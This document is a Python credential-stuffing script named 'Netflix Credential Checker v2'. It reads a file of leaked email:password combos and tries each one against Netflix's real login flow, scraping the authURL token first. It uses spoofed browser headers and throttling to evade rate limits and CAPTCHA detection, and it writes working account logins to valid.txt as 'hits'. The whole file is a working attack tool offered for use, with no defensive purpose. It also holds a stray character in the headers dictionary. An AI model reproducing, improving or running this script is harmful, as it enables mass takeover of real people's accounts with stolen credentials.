#!/usr/bin/env python3
"""
Netflix Credential Checker v2
Uses Netflix's authentication endpoints more accurately
Format: url:email:password or email:password
"""

import asyncio
import json
import re
import sys
import time
from pathlib import Path

try:
    import httpx
except ImportError:
    print("Installing httpx...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx"])
    import httpx

# Configuration
MAX_CONCURRENT = 3  # Lower concurrency to avoid blocks
TIMEOUT = 45
DELAY_BETWEEN = 1.0  # Longer delay

HEADERS = {i
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Sec-Ch-Ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}


def parse_combo_line(line: str) -> tuple[str, str] | None:
    """Parse combo line in format url:email:password or email:password"""
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    
    parts = line.split(":")
    
    if len(parts) >= 3:
        for i, part in enumerate(parts):
            if "@" in part:
                email = part
                password = ":".join(parts[i+1:])
                return email, password
    elif len(parts) == 2:
        if "@" in parts[0]:
            return parts[0], parts[1]
    
    return None


async def check_credential(email: str, password: str, semaphore: asyncio.Semaphore, index: int, total: int) -> dict:
    """Check a single credential using Netflix's login flow"""
    async with semaphore:
        result = {
            "email": email,
            "password": password,
            "valid": False,
            "error": None,
            "info": None
        }
        
        try:
            async with httpx.AsyncClient(
                timeout=TIMEOUT, 
                follow_redirects=True,
                http2=True
            ) as client:
                
                # Step 1: Get the login page to extract tokens
                resp = await client.get(
                    "https://www.netflix.com/login",
                    headers=HEADERS
                )
                
                if resp.status_code != 200:
                    result["error"] = f"Failed to load login page: {resp.status_code}"
                    return result
                
                html = resp.text
                
                # Extract authURL (required for login)
                auth_match = re.search(r'"authURL"\s*:\s*"([^"]+)"', html)
                if not auth_match:
                    auth_match = re.search(r'name="authURL"\s+value="([^"]+)"', html)
                
                if not auth_match:
                    result["error"] = "Could not find authURL"
                    return result
                
                auth_url = auth_match.group(1)
                
                # Add delay
                await asyncio.sleep(DELAY_BETWEEN)
                
                # Step 2: Submit login form
                login_data = {
                    "userLoginId": email,
                    "password": password,
                    "rememberMe": "true",
                    "flow": "websiteSignUp",
                    "mode": "login",
                    "action": "loginAction",
                    "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                    "authURL": auth_url,
                    "nextPage": "",
                    "showPassword": "",
                    "countryCode": "+1",
                    "countryIsoCode": "US"
                }
                
                login_headers = {
                    **HEADERS,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://www.netflix.com",
                    "Referer": "https://www.netflix.com/login",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                }
                
                resp = await client.post(
                    "https://www.netflix.com/login",
                    data=login_data,
                    headers=login_headers
                )
                
                final_url = str(resp.url)
                html = resp.text
                html_lower = html.lower()
                
                # Check for success indicators
                if any(x in final_url for x in ["/browse", "/profiles", "/YourAccount", "/member"]):
                    result["valid"] = True
                    
                    # Try to get profile info
                    if "profiles" in final_url or "browse" in final_url:
                        result["info"] = "Active account"
                    else:
                        result["info"] = f"Logged in -> {final_url}"
                
                # Check for household/payment issues (still valid credentials)
                elif "account on hold" in html_lower or "update your payment" in html_lower:
                    result["valid"] = True
                    result["info"] = "Account on hold (payment issue)"
                
                elif "update your primary location" in html_lower or "household" in html_lower:
                    result["valid"] = True
                    result["info"] = "Household verification needed"
                
                # Invalid credentials
                elif any(x in html_lower for x in [
                    "incorrect password",
                    "password is incorrect", 
                    "try again",
                    "cannot find an account",
                    "sorry, we can't find an account"
                ]):
                    result["error"] = "Invalid credentials"
                
                # Rate limited
                elif "too many" in html_lower or "try again later" in html_lower:
                    result["error"] = "Rate limited"
                
                # CAPTCHA or bot detection
                elif "recaptcha" in html_lower or "captcha" in html_lower:
                    result["error"] = "CAPTCHA required"
                
                # Still on login page (unclear result)
                elif "/login" in final_url:
                    # Check for specific error messages
                    error_match = re.search(r'class="[^"]*error[^"]*"[^>]*>([^<]+)', html)
                    if error_match:
                        result["error"] = error_match.group(1).strip()
                    else:
                        result["error"] = "Login failed (stayed on login page)"
                
                else:
                    result["error"] = f"Unknown state: {final_url[:50]}"
                
        except httpx.TimeoutException:
            result["error"] = "Timeout"
        except httpx.ConnectError:
            result["error"] = "Connection error"
        except Exception as e:
            result["error"] = str(e)[:50]
        
        return result


async def main():
    if len(sys.argv) < 2:
        print("Netflix Credential Checker v2")
        print("=" * 40)
        print("Usage: python netflix_checker.py <combo_file>")
        print("")
        print("Combo format (one per line):")
        print("  www.netflix.com:email@example.com:password")
        print("  email@example.com:password")
        sys.exit(1)
    
    combo_file = Path(sys.argv[1])
    if not combo_file.exists():
        print(f"Error: File not found: {combo_file}")
        sys.exit(1)
    
    # Parse combos
    combos = []
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            parsed = parse_combo_line(line)
            if parsed:
                combos.append(parsed)
    
    if not combos:
        print("No valid combos found")
        sys.exit(1)
    
    print("Netflix Credential Checker v2")
    print("=" * 50)
    print(f"[*] Loaded: {len(combos)} combos")
    print(f"[*] Threads: {MAX_CONCURRENT}")
    print(f"[*] Delay: {DELAY_BETWEEN}s between requests")
    print("=" * 50)
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    stats = {"valid": 0, "invalid": 0, "error": 0}
    
    valid_file = Path("valid.txt")
    start_time = time.time()
    
    with open(valid_file, "a", encoding="utf-8") as vf:
        tasks = [
            check_credential(email, password, semaphore, i, len(combos)) 
            for i, (email, password) in enumerate(combos)
        ]
        
        for i, coro in enumerate(asyncio.as_completed(tasks)):
            result = await coro
            
            if result["valid"]:
                stats["valid"] += 1
                status = "\033[92m[HIT]\033[0m"
                line = f"{result['email']}:{result['password']}"
                if result["info"]:
                    line += f" | {result['info']}"
                vf.write(line + "\n")
                vf.flush()
            elif "Rate" in str(result.get("error", "")) or "CAPTCHA" in str(result.get("error", "")):
                stats["error"] += 1
                status = "\033[93m[BLOCKED]\033[0m"
            else:
                stats["invalid"] += 1
                status = "\033[91m[BAD]\033[0m"
            
            print(f"[{i+1}/{len(combos)}] {status} {result['email']} | {result.get('error') or result.get('info') or ''}")
    
    elapsed = time.time() - start_time
    cpm = (len(combos) / elapsed) * 60 if elapsed > 0 else 0
    
    print("=" * 50)
    print(f"[*] Done in {elapsed:.1f}s ({cpm:.1f} CPM)")
    print(f"[*] Hits: {stats['valid']} | Bad: {stats['invalid']} | Errors: {stats['error']}")
    if stats["valid"] > 0:
        print(f"[*] Saved to: {valid_file.absolute()}")


if __name__ == "__main__":
    asyncio.run(main())
